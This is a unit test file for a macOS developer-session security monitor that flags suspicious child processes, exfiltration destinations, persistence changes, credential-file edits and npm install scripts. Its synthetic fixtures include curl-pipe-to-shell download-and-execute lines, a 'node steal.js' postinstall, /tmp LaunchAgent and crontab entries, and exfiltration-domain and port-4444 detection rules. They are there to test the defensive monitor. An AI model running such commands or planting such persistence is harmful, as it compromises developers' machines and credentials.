"""Tests for the dev session security monitor (macguard_devsec). Run: /usr/bin/python3 -m unittest discover -s tests -v

Detection rules and diff logic run on synthetic process tables, sockets and files in a temp HOME, so they
are deterministic. A few live, read-only checks (ps, netstat, FSEvents) confirm the system calls still work.
"""
import io
import json
import os
import plistlib
import sys
import time
import unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import macguard_devsec as sec  # noqa: E402
import macguard_mcp as mcp  # noqa: E402
from test_macguard import TempHome  # noqa: E402
import test_macguard  # noqa: E402  (subclassed, not re-run)

mg = sec.mg


def PR(pid, name, ppid=1, exe=None, args=None, uid=None, start="Thu Nov 13 10:00:00 2026"):
    exe = exe or f"/usr/local/bin/{name}"
    return pid, dict(pid=pid, ppid=ppid, uid=os.getuid() if uid is None else uid, exe=exe, args=args or exe,
                     name=sec.proc_name(exe, args or exe), start=start)


def table(*rows):
    return dict(rows)


def SOCK(pid, rhost, rport, proc="node", tx=0, rx=0, state="ESTABLISHED", lhost="192.168.1.5", lport=50000, proto="tcp4"):
    return dict(proto=proto, lhost=lhost, lport=lport, rhost=rhost, rport=rport, state=state, proc=proc, pid=pid, rx=rx, tx=tx)


class TestProcessRules(TempHome):
    def test_watched_roots(self):
        self.assertTrue(sec.is_watched_root(PR(1, "node")[1]))
        self.assertTrue(sec.is_watched_root(PR(1, "python3.12")[1]))
        self.assertTrue(sec.is_watched_root(PR(1, "Code Helper", exe="/Applications/Visual Studio Code.app/Contents/x")[1]))
        self.assertTrue(sec.is_watched_root(PR(1, "ollama")[1]))
        self.assertFalse(sec.is_watched_root(PR(1, "Finder", exe="/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder")[1]))

    def test_spawn_classification(self):
        procs = table(PR(10, "npm"), PR(11, "sh", 10, exe="/bin/sh", args="sh -c node install.js"),
                      PR(12, "curl", 11, exe="/usr/bin/curl", args="curl -s https://x.example/a"),
                      PR(13, "osascript", 10, exe="/usr/bin/osascript", args="osascript -e display dialog"),
                      PR(14, "payload", 10, exe="/tmp/payload"),
                      PR(15, "sh", 10, exe="/bin/sh", args="sh -c curl -s https://x.example/i.sh | bash"),
                      PR(16, "x", 10, exe=os.path.join(self.home, "Downloads/x")))
        with mock.patch("os.getpid", return_value=999999):
            alerts = {a["pid"]: a for a in sec.tree_alerts(sec.watched_trees(procs))}
        self.assertEqual(alerts[11]["severity"], "info")        # a shell under npm is normal
        self.assertEqual(alerts[12]["severity"], "warning")     # curl
        self.assertEqual(alerts[13]["severity"], "critical")    # osascript
        self.assertEqual(alerts[14]["severity"], "critical")    # binary from /tmp
        self.assertIn("download-and-execute", alerts[15]["title"])
        self.assertIn("Downloads", alerts[16]["title"])
        self.assertNotIn(10, alerts)                            # the root itself is not an alert

    def test_nested_roots_collapse_and_own_tree_is_hidden(self):
        me = os.getpid()
        procs = table(PR(10, "claude", args="claude"), PR(11, "node", 10), PR(12, "npm", 11),
                      PR(me, "python3", 12), PR(me + 1, "ps", me, exe="/bin/ps"))
        trees = sec.watched_trees(procs)
        self.assertEqual([t["pid"] for t in trees], [10])
        pids = [n["pid"] for n, _ in sec.walk(trees)]
        self.assertNotIn(me, pids)
        self.assertNotIn(me + 1, pids)

    def test_other_users_roots_are_ignored(self):
        procs = table(PR(10, "node", uid=0), PR(11, "curl", 10, exe="/usr/bin/curl"))
        self.assertEqual(sec.watched_trees(procs), [])

    def test_orphan_detection_and_pid_reuse(self):
        w = sec.ProcessWatcher()
        procs = table(PR(10, "node"), PR(11, "worker", 10, exe="/Users/x/worker"))
        w.poll(procs, jobs={})
        self.assertIn(11, w.lineage)
        # parent exits, child reparented to launchd: one warning, once
        procs = table(PR(11, "worker", 1, exe="/Users/x/worker"))
        _, alerts = w.poll(procs, jobs={})
        self.assertEqual([a["title"] for a in alerts], ["Left running after node exited"])
        self.assertEqual(w.poll(procs, jobs={})[1], [])
        self.assertEqual(len(w.orphans(procs)), 1)
        # a launchd job is not an orphan; a reused pid is forgotten
        w2 = sec.ProcessWatcher()
        w2.poll(table(PR(10, "node"), PR(11, "svc", 10, exe="/Users/x/svc")), jobs={})
        self.assertEqual(w2.poll(table(PR(11, "svc", 1, exe="/Users/x/svc")), jobs={11: "com.x"})[1], [])
        w2.poll(table(PR(11, "other", 1, exe="/Users/x/other")), jobs={})
        self.assertNotIn(11, w2.lineage)

    def test_alerts_are_reported_once(self):
        w = sec.ProcessWatcher()
        procs = table(PR(10, "node"), PR(12, "curl", 10, exe="/usr/bin/curl"))
        with mock.patch("os.getpid", return_value=999999):
            self.assertEqual(len(w.poll(procs, jobs={})[1]), 1)
            self.assertEqual(w.poll(procs, jobs={})[1], [])


class TestNetworkRules(TempHome):
    def conn(self, **kw):
        c = dict(pid=5, proc="node", parent="npm", exe="/x/node", ppid=4, proto="tcp4", rhost="93.184.216.34", rport=443,
                 state="ESTABLISHED", rx=0, tx=0)
        c.update(kw)
        return c

    def titles(self, conn, name):
        return {a["title"]: a["severity"] for a in sec.connection_alerts(conn, name)}

    def test_exfil_domains(self):
        t = self.titles(self.conn(), "abc.ngrok-free.app")
        self.assertEqual(t, {"node talks to ngrok tunnel": "warning"})
        t = self.titles(self.conn(tx=5 << 20), "discord.com")
        self.assertEqual(t["node talks to Discord (webhooks)"], "critical")
        self.assertEqual(self.titles(self.conn(), "notdiscord.com"), {})
        self.assertEqual(sec.domain_matches("API.Telegram.org.", sec.EXFIL_DOMAINS), "api.telegram.org")

    def test_raw_ip_ports_and_upload(self):
        t = self.titles(self.conn(rport=4444), "")
        self.assertEqual(t["node connects to an IP with no DNS name"], "info")
        self.assertEqual(t["node uses port 4444 (metasploit default)"], "critical")
        self.assertIn("node uses uncommon port 2525", self.titles(self.conn(rport=2525), "mail.example.com"))
        self.assertEqual(self.titles(self.conn(rport=443), "registry.npmjs.org"), {})
        t = self.titles(self.conn(tx=sec.HIGH_UPLOAD), "files.example.com")
        self.assertEqual(t["node uploaded 50.0M"], "warning")

    def test_live_connections_filters_and_enriches(self):
        procs = table(PR(4, "npm"), PR(5, "node", 4))
        conns = [SOCK(5, "93.184.216.34", 443, tx=10), SOCK(5, "192.168.1.9", 80), SOCK(5, "*", None, state="LISTEN"),
                 SOCK(5, "127.0.0.1", 11434)]
        out = sec.live_connections(procs, conns)
        self.assertEqual(len(out), 1)
        self.assertEqual((out[0]["proc"], out[0]["parent"], out[0]["tx"]), ("node", "npm", 10))

    def test_ollama_exposure(self):
        procs = table(PR(7, "ollama"))
        conns = [SOCK(7, "*", None, proc="ollama", state="LISTEN", lhost="*", lport=11434),
                 SOCK(7, "8.8.4.4", 443, proc="ollama"), SOCK(7, "1.0.0.1", 443, proc="ollama")]
        alerts = sec.ollama_alerts(conns, procs, {"8.8.4.4": "evil.example.net", "1.0.0.1": "registry.ollama.com"})
        sevs = sorted(a["severity"] for a in alerts)
        self.assertEqual(sevs, ["critical", "warning"])
        self.assertTrue(any("listens on *:11434" in a["title"] for a in alerts))
        safe = [SOCK(7, "*", None, proc="ollama", state="LISTEN", lhost="127.0.0.1", lport=11434)]
        self.assertEqual(sec.ollama_alerts(safe, procs, {}), [])

    def test_project_baseline_learns_then_alerts(self):
        b = sec.Baselines(os.path.join(self.home, "b.json"))
        proj = os.path.join(self.home, "app")
        self.assertFalse(b.check(proj, "api.stripe.com", learning=True))   # first session learns
        self.assertFalse(b.check(proj, "registry.npmjs.org"))              # known-good never alerts
        b.finish_learning([proj])
        self.assertFalse(b.check(proj, "files.stripe.com"))                # same site as learned
        self.assertTrue(b.check(proj, "collector.example.net"))            # new site after learning
        self.assertFalse(b.check(proj, "collector.example.net"))           # only once
        b.save()
        self.assertTrue(sec.Baselines(b.path).data[proj]["learned"])
        self.assertEqual(sec.site_of("a.b.example.co.uk"), "example.co.uk")

    def test_network_watcher_end_to_end(self):
        proj = os.path.join(self.home, "DEV/app")
        os.makedirs(os.path.join(proj, ".git"))
        procs = table(PR(4, "npm"), PR(5, "node", 4))
        w = sec.NetworkWatcher()
        w.dns = mock.Mock(lookup_many=lambda ips, budget=3.0: {"93.184.216.34": "hooks.webhook.site"})
        w.baselines = sec.Baselines(os.path.join(self.home, "b.json"))
        conns, alerts = w.poll(procs, [SOCK(5, "93.184.216.34", 443)], cwds={5: os.path.join(proj, "src")})
        self.assertEqual(conns[0]["project"], "~/DEV/app")
        self.assertEqual([a["title"] for a in alerts], ["node talks to webhook catcher"])
        self.assertEqual(w.poll(procs, [SOCK(5, "93.184.216.34", 443)], cwds={5: proj})[1], [])  # deduped


class TestPersistence(TempHome):
    def setUp(self):
        super().setUp()
        self.run = mock.patch.object(mg, "run", side_effect=self.fake_run)
        self.run.start()
        self.addCleanup(self.run.stop)
        self.cron = ""

    def fake_run(self, cmd, timeout=60):
        if cmd[:2] == ["crontab", "-l"]:
            return 0, self.cron, ""
        if cmd[0] == "osascript":
            return 0, "/Applications/A.app", ""
        return 1, "", ""

    def test_redaction(self):
        text = "//registry.npmjs.org/:_authToken=npm_SECRET123\nexport GITHUB_TOKEN=ghp_abc\nalias ll='ls -l'\n"
        r = sec.redact(text)
        self.assertNotIn("npm_SECRET123", r)
        self.assertNotIn("ghp_abc", r)
        self.assertIn("_authToken=***", r)
        self.assertIn("alias ll='ls -l'", r)

    def test_diff_reports_added_modified_removed(self):
        la = self.mk("Library/LaunchAgents/com.good.plist", 10)
        rc = self.mk(".zshrc", 0)
        with open(rc, "w") as fh:
            fh.write("export PATH=$PATH:/opt/bin\n")
        before = sec.persistence_snapshot()
        os.remove(la)
        with open(os.path.join(self.home, "Library/LaunchAgents/com.evil.agent.plist"), "wb") as fh:
            plistlib.dump({"Label": "com.evil.agent", "ProgramArguments": ["/tmp/x"], "RunAtLoad": True}, fh,
                          fmt=plistlib.FMT_BINARY)
        with open(rc, "a") as fh:
            fh.write("curl -s https://x.example/i.sh | sh\nexport API_KEY=sk-live-123\n")
        self.cron = "* * * * * /tmp/x\n"
        changes = {a["title"]: a for a in sec.persistence_diff(before, sec.persistence_snapshot())}
        added = next(a for t, a in changes.items() if "com.evil.agent" in t)
        self.assertEqual((added["severity"], added["change"]), ("critical", "added"))
        self.assertIn('"/tmp/x"', added["diff"])                     # binary plist shown as readable JSON
        mod = next(a for t, a in changes.items() if ".zshrc" in t)
        self.assertEqual((mod["severity"], mod["change"]), ("warning", "modified"))
        self.assertIn("+curl -s https://x.example/i.sh | sh", mod["diff"])
        self.assertNotIn("sk-live-123", mod["diff"])                 # secrets never reach the diff
        removed = next(a for t, a in changes.items() if "com.good" in t)
        self.assertEqual(removed["severity"], "info")
        self.assertEqual(changes["crontab changed"]["severity"], "critical")

    def test_login_items_and_no_change(self):
        snap = sec.persistence_snapshot()
        self.assertEqual(sec.persistence_diff(snap, sec.persistence_snapshot()), [])
        later = {**snap, "login_items": snap["login_items"] + ["/Users/x/evil.app"]}
        self.assertEqual([a["title"] for a in sec.persistence_diff(snap, later)], ["Login item added: /Users/x/evil.app"])
        self.assertEqual(sec.persistence_diff({**snap, "login_items": None}, later), [])  # unknown before: no claim

    def test_project_hooks_and_npmrc(self):
        proj = os.path.join(self.home, "app")
        os.makedirs(os.path.join(proj, ".git/hooks"))
        self.mk("app/.git/hooks/pre-commit.sample", 5)
        before = sec.persistence_snapshot([proj])
        self.mk("app/.git/hooks/post-checkout", 5)
        self.mk("app/.npmrc", 5)
        titles = sorted(a["title"] for a in sec.persistence_diff(before, sec.persistence_snapshot([proj])))
        self.assertEqual(len(titles), 2)
        self.assertTrue(any("Git hooks added" in t and "post-checkout" in t for t in titles))
        self.assertTrue(any("Npm config added" in t for t in titles))


class TestFiles(TempHome):
    def places(self):
        os.makedirs(os.path.join(self.home, ".ssh"))
        os.makedirs(os.path.join(self.home, ".config/gh"))
        os.makedirs(os.path.join(self.home, "app"))
        return sec.sensitive_places([os.path.join(self.home, "app")])

    def test_event_classification(self):
        pl = self.places()
        h = self.home
        a = sec.file_event_alert(f"{h}/.ssh/authorized_keys", 0x1000, pl)
        self.assertEqual((a["severity"], a["title"]), ("critical", "SSH keys: authorized_keys modified"))
        self.assertEqual(sec.file_event_alert(f"{h}/.ssh/known_hosts", 0x1000, pl)["severity"], "warning")
        self.assertEqual(sec.file_event_alert(f"{h}/.ssh/new_key", 0x100, pl)["severity"], "critical")
        self.assertEqual(sec.file_event_alert(f"{h}/.config/gh/hosts.yml", 0x1000, pl)["severity"], "warning")
        self.assertEqual(sec.file_event_alert(f"{h}/.config/other/x", 0x1000, pl)["severity"], "info")
        self.assertEqual(sec.file_event_alert(f"{h}/app/.env.local", 0x1000, pl)["severity"], "warning")
        self.assertIsNone(sec.file_event_alert(f"{h}/app/src/index.js", 0x1000, pl))   # only .env in projects
        self.assertIsNone(sec.file_event_alert(f"{h}/elsewhere/.env", 0x1000, pl))
        self.assertEqual(sec.describe_flags(0x100 | 0x1000), "created, modified")
        self.assertIsNone(sec.file_event_alert(f"{h}/.ssh", 0x100 | 0x20000, pl))  # folders themselves are noise

    def test_polling_fallback(self):
        pl = self.places()
        w = sec.FSWatcher(pl)
        w.mode = "polling"
        w.snap = w._scan()
        self.mk("app/.env", 10)
        self.mk("app/notes.txt", 10)
        titles = [a["title"] for a in w.poll()]
        self.assertEqual(titles, [".env in app: .env created"])

    def test_fsevents_live(self):
        pl = self.places()
        w = sec.FSWatcher(pl, latency=0.2)
        if w.start() != "fsevents":
            self.skipTest("FSEvents unavailable: " + getattr(w, "error", ""))
        try:
            time.sleep(0.5)
            self.mk(".ssh/id_test", 10)
            found = []
            for _ in range(50):
                found += w.poll()
                if any("id_test" in a["title"] for a in found):
                    break
                time.sleep(0.1)
            self.assertTrue(any("id_test" in a["title"] for a in found), found)
        finally:
            w.stop()


def lulu_plist(rules, path):
    """Build a minimal NSKeyedArchiver file shaped like LuLu's rules.plist."""
    objs = ["$null"]

    def add(x):
        objs.append(x)
        return plistlib.UID(len(objs) - 1)

    def enc(v):
        if isinstance(v, dict):
            keys = [enc(k) for k in v]
            vals = [enc(x) for x in v.values()]
            return add({"NS.keys": keys, "NS.objects": vals})
        if isinstance(v, list):
            return add({"NS.objects": [enc(x) for x in v]})
        if isinstance(v, float) and v > 1e8:
            return add({"NS.time": v - sec.COCOA_EPOCH})
        return add(v)
    grouped = {}
    for r in rules:
        grouped.setdefault(r["key"], {"rules": []})["rules"].append(r)
    root = enc(grouped)
    with open(path, "wb") as fh:
        plistlib.dump({"$archiver": "NSKeyedArchiver", "$version": 100000, "$top": {"root": root}, "$objects": objs}, fh,
                      fmt=plistlib.FMT_BINARY)


class TestLulu(TempHome):
    def rule(self, uuid, name, path, addr="*", port="*", action=1, signer=4, status=0, age_days=1):
        return {"uuid": uuid, "key": path, "name": name, "path": path, "action": action, "endpointAddr": addr,
                "endpointPort": port, "creation": time.time() - age_days * 86400, "type": 3,
                "csInfo": {"signatureStatus": status, "signatureSigner": signer}}

    def test_parse_and_audit(self):
        p = os.path.join(self.tmp, "rules.plist")
        node = self.mk("bin/node", 1)
        lulu_plist([self.rule("U1", "node", node), self.rule("U2", "uv", "/tmp/x/uv"),
                    self.rule("U3", "app", node, addr="api.example.com", port="443", age_days=400),
                    self.rule("U4", "blocked", node, action=0), self.rule("U5", "gone", "/Users/x/nope", status=-1)], p)
        rules, err = sec.lulu_rules(p)
        self.assertIsNone(err)
        self.assertEqual(len(rules), 5)
        rows, alerts = sec.lulu_audit(rules, tags={})
        by = {r["uuid"]: r for r in rows}
        self.assertNotIn("U4", by)                                         # block rules aren't audited
        self.assertEqual(by["U2"]["severity"], "critical")                 # temp folder
        self.assertEqual(by["U1"]["severity"], "warning")                  # interpreter anywhere
        self.assertIn("over 180 days old", by["U3"]["flags"])
        self.assertIn("unsigned program", by["U5"]["flags"])
        self.assertIn("program no longer exists: stale rule", by["U5"]["flags"])
        self.assertEqual(rows[0]["uuid"], "U2")                            # worst first

    def test_expiry_reminders(self):
        sec.lulu_tag("U1", 1)
        tags = sec.load_json(sec.lulu_tags_path(), {})
        r = {"uuid": "U1", "name": "node", "path": "/x", "action": "allow", "disabled": False, "addr": "a", "port": "1",
             "created": None, "signed": True, "apple": False}
        _, alerts = sec.lulu_audit([r], tags=tags)
        self.assertTrue(any("temporary until" in a["title"] for a in alerts))
        _, alerts = sec.lulu_audit([r], tags=tags, now=time.time() + 7200)
        self.assertTrue(any("expired" in a["title"] and a["severity"] == "warning" for a in alerts))
        self.assertEqual(sec.lulu_expired(tags, now=time.time() + 7200), ["U1"])
        sec.lulu_tag("U1", 0)
        self.assertEqual(sec.load_json(sec.lulu_tags_path(), {}), {})

    def test_unreadable_and_missing(self):
        rules, err = sec.lulu_rules(os.path.join(self.tmp, "none.plist"))
        self.assertIsNone(rules)
        self.assertIn("isn't installed", err)
        p = os.path.join(self.tmp, "locked.plist")
        with open(p, "w") as fh:
            fh.write("x")
        with mock.patch("builtins.open", side_effect=PermissionError):
            rules, err = sec.lulu_rules(p)
        self.assertIn("LuLu > Rules", err)


class FakeResp(io.BytesIO):
    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


class TestDeps(TempHome):
    def project(self, lock):
        proj = os.path.join(self.home, "web")
        os.makedirs(proj)
        with open(os.path.join(proj, "package-lock.json"), "w") as fh:
            json.dump(lock, fh)
        return proj

    def test_lockfile_v3_scripts_offline(self):
        proj = self.project({"lockfileVersion": 3, "packages": {
            "": {"name": "web"}, "node_modules/esbuild": {"version": "0.19.0", "hasInstallScript": True},
            "node_modules/left-pad": {"version": "1.3.0"}, "node_modules/lib": {"link": True}}})
        os.makedirs(os.path.join(proj, "node_modules/left-pad"))
        with open(os.path.join(proj, "node_modules/left-pad/package.json"), "w") as fh:
            json.dump({"scripts": {"postinstall": "node steal.js", "prepare": "tsc", "test": "x"}}, fh)
        with mock.patch("urllib.request.urlopen", side_effect=AssertionError("must stay offline")):
            r = sec.scan_deps(proj)
        self.assertEqual(r["packages"], 2)
        self.assertEqual({s["name"]: s["scripts"] for s in r["install_scripts"]},
                         {"esbuild": {"(lockfile)": "hasInstallScript"}, "left-pad": {"postinstall": "node steal.js"}})
        self.assertFalse(r["online"])
        self.assertTrue(any("--ignore-scripts" in a for a in r["advice"]))

    def test_lockfile_v1_and_osv(self):
        proj = self.project({"lockfileVersion": 1, "dependencies": {
            "lodash": {"version": "4.17.15"}, "a": {"version": "1.0.0", "dependencies": {"b": {"version": "2.0.0"}}},
            "local": {"version": "file:../local"}}})
        sent = []

        def opener(req, timeout=0):
            if req.full_url == sec.OSV_URL:
                body = json.loads(req.data)
                sent.append(body)
                return FakeResp(json.dumps({"results": [{"vulns": [{"id": "GHSA-1"}]} if q["package"]["name"] == "lodash"
                                                        else {} for q in body["queries"]]}).encode())
            return FakeResp(json.dumps({"id": "GHSA-1", "summary": "Prototype pollution",
                                        "database_specific": {"severity": "HIGH"}}).encode())
        r = sec.scan_deps(proj, online=True, opener=opener)
        self.assertEqual(r["packages"], 3)
        # only names, versions and the ecosystem leave the machine
        self.assertEqual({tuple(sorted(q)) for q in sent[0]["queries"]}, {("package", "version")})
        self.assertEqual({tuple(sorted(q["package"])) for q in sent[0]["queries"]}, {("ecosystem", "name")})
        self.assertEqual(r["vulnerabilities"][0]["name"], "lodash")
        self.assertEqual(r["vulnerabilities"][0]["severity"], "high")
        self.assertTrue(any(a["severity"] == "critical" for a in r["alerts"]))

    def test_osv_failure_is_reported_not_raised(self):
        proj = self.project({"lockfileVersion": 3, "packages": {"node_modules/x": {"version": "1.0.0"}}})
        r = sec.scan_deps(proj, online=True, opener=mock.Mock(side_effect=OSError("offline")))
        self.assertIn("OSV lookup failed", r["error"])

    def test_missing_lockfile(self):
        os.makedirs(os.path.join(self.home, "empty"))
        with self.assertRaises(FileNotFoundError):
            sec.scan_deps(os.path.join(self.home, "empty"))


class TestAlertLog(TempHome):
    def test_rotation_and_filter(self):
        path = os.path.join(self.home, "alerts.jsonl")
        with mock.patch.object(sec, "ALERT_LOG_MAX", 200):
            for i in range(30):
                sec.log_alerts([sec.alert("network", "warning" if i % 2 else "info", f"t{i}")], path)
        self.assertTrue(os.path.exists(path + ".1"))
        self.assertFalse(os.path.exists(path + f".{sec.ALERT_LOG_KEEP + 1}"))
        rows = sec.read_alerts(500, "warning", path)
        self.assertTrue(rows and all(r["severity"] == "warning" for r in rows))
        self.assertEqual(rows[-1]["title"], "t29")


class TestSession(TempHome):
    def setUp(self):
        super().setUp()
        for target, value in (("persistence_snapshot", lambda projects=(), with_login_items=True:
                               {"time": "t", "files": {}, "crontab": self.cron, "projects": list(projects),
                                "login_items": []}),
                              ("lulu_rules", lambda path=None: (None, "LuLu isn't installed"))):
            p = mock.patch.object(sec, target, side_effect=value)
            p.start()
            self.addCleanup(p.stop)
        self.cron = ""

    def test_start_events_stop_report(self):
        proj = os.path.join(self.home, "web")
        os.makedirs(proj)
        with open(os.path.join(proj, "package-lock.json"), "w") as fh:
            json.dump({"lockfileVersion": 3, "packages": {"node_modules/esbuild": {"version": "1", "hasInstallScript": True}}}, fh)
        s = sec.start_session([proj], background=False, label="t")
        self.assertEqual(sec.current_session()["id"], s["id"])
        with self.assertRaises(RuntimeError):
            with mock.patch.object(sec, "pid_alive", return_value=True):
                sec.save_json(sec.session_file(), {**s, "monitor_pid": 123})
                sec.start_session([proj], background=False)
        sec.save_json(sec.session_file(), s)
        sec.write_events(os.path.join(sec.sessions_dir(s["id"]), "events.jsonl"), [
            sec.alert("network", "warning", "New destination for web", "node -> x.example:443"),
            sec.alert("process", "critical", "npm spawned osascript", "npm -> osascript", pid=9, exe="/usr/bin/osascript"),
            sec.alert("file", "warning", ".env in web: .env modified", "~/web/.env")])
        self.cron = "* * * * * /tmp/evil\n"
        r = sec.stop_session(online=False)
        self.assertIsNone(sec.current_session())
        self.assertEqual(r["summary"]["critical"], 2)                 # osascript + crontab
        self.assertEqual(len(r["new_destinations"]), 1)
        self.assertEqual(r["persistence"][0]["title"], "crontab changed")
        self.assertEqual(r["packages"][0]["install_scripts"][0]["name"], "esbuild")
        md = mg.read_text(os.path.join(sec.sessions_dir(s["id"]), "report.md"))
        for heading in ("New destinations", "Spawned scripts", "Persistence changes", "Sensitive file changes",
                        "Packages", "LuLu rules still open", "Limits"):
            self.assertIn("## " + heading, md)
        self.assertEqual(sec.load_report()["id"], s["id"])
        self.assertEqual(sec.load_json(os.path.join(sec.sessions_dir(s["id"]), "report.json"), {})["id"], s["id"])
        with self.assertRaises(RuntimeError):
            sec.stop_session()

    def test_monitor_loop_runs_and_records(self):
        s = sec.start_session([], background=False)
        procs = table(PR(4, "npm"), PR(5, "curl", 4, exe="/usr/bin/curl"))
        with mock.patch.object(sec, "proc_snapshot", return_value=procs), \
                mock.patch.object(mg, "sockets", return_value=[SOCK(5, "93.184.216.34", 443, proc="curl")]), \
                mock.patch.object(mg, "launchd_jobs", return_value={}), \
                mock.patch.object(sec, "process_cwds", return_value={}), \
                mock.patch.object(sec.DnsCache, "lookup_many", lambda self, ips, budget=3.0: {"93.184.216.34": "pastebin.com"}), \
                mock.patch.object(sec.FSWatcher, "start", lambda self: "polling"), \
                mock.patch("os.getpid", return_value=999999), mock.patch("signal.signal"):
            sec.run_monitor(s["id"], max_seconds=0.1, interval=0.1)
        titles = [e["title"] for e in sec.read_events(s["id"])]
        self.assertIn("npm spawned curl (downloader)", titles)
        self.assertIn("curl talks to Pastebin", titles)
        self.assertEqual(titles[-1], "monitor stopped")
        self.assertTrue(sec.read_alerts())


class TestMcpTools(TempHome):
    def test_new_tools_listed_with_schemas(self):
        names = {t[0] for t in mcp.TOOLS}
        for n in ("live_connections", "process_tree", "persistence_changes", "lulu_audit", "lulu_reminder",
                  "scan_dependencies", "dev_session", "security_alerts"):
            self.assertIn(n, names)

    def test_online_scan_needs_consent(self):
        r = mcp.call_tool("scan_dependencies", {"path": self.home, "online": True})
        self.assertTrue(r["isError"])
        self.assertIn("confirm_online", r["content"][0]["text"])

    def test_session_status_without_session(self):
        r = mcp.call_tool("dev_session", {"action": "status"})
        self.assertIsNone(r["structuredContent"]["session"])


class TestDevsecWebRoutes(test_macguard.TestWebUI):
    """The UI's /api/devsec/* routes, on the real server with a temp HOME."""

    def test_devsec_routes(self):
        import macguard_devsec  # the server imports this same module object
        lulu_none = mock.patch.object(macguard_devsec, "lulu_rules", lambda path=None: (None, "LuLu isn't installed"))
        snap = mock.patch.object(macguard_devsec, "persistence_snapshot",
                                 lambda projects=(), with_login_items=True: {"time": "t", "files": {}, "crontab": "",
                                                                             "projects": list(projects), "login_items": []})
        with lulu_none, snap:
            self.assertEqual(self.req("/api/devsec/session", token=None)[0], 403)
            r = json.loads(self.req("/api/devsec/session")[1])
            self.assertIsNone(r["session"])
            self.assertEqual(json.loads(self.req("/api/devsec/lulu")[1]), {"available": False,
                                                                            "guidance": "LuLu isn't installed"})
            self.assertIsNone(json.loads(self.req("/api/devsec/persist")[1])["since"])     # first call saves a baseline
            self.assertEqual(json.loads(self.req("/api/devsec/persist")[1])["changes"], [])
            tree = json.loads(self.req("/api/devsec/tree")[1])
            self.assertIn("trees", tree)
            self.assertEqual(self.req("/api/devsec/scan-deps", body={"path": "/nope"})[0], 400)
            self.assertEqual(self.req("/api/devsec/reveal", body={"path": "relative/x"})[0], 400)
            self.assertEqual(self.req("/api/devsec/session", body={"action": "bogus"})[0], 400)
            self.assertEqual(self.req("/api/devsec/session", body={"action": "stop"})[0], 400)  # nothing running
            self.assertIsNone(json.loads(self.req("/api/devsec/report")[1])["report"])


# inherit TestWebUI's server fixture, not its tests (they already run in test_macguard)
for _name in dir(test_macguard.TestWebUI):
    if _name.startswith("test_"):
        setattr(TestDevsecWebRoutes, _name, None)


class TestLive(unittest.TestCase):
    """Read-only checks against this Mac."""

    def test_proc_snapshot_sees_this_process(self):
        procs = sec.proc_snapshot()
        self.assertIn(os.getpid(), procs)
        self.assertTrue(procs[os.getpid()]["start"])

    def test_live_connections_shape(self):
        for c in sec.live_connections():
            self.assertFalse(mg.is_private(c["rhost"]))
            self.assertIn("parent", c)


if __name__ == "__main__":
    unittest.main()
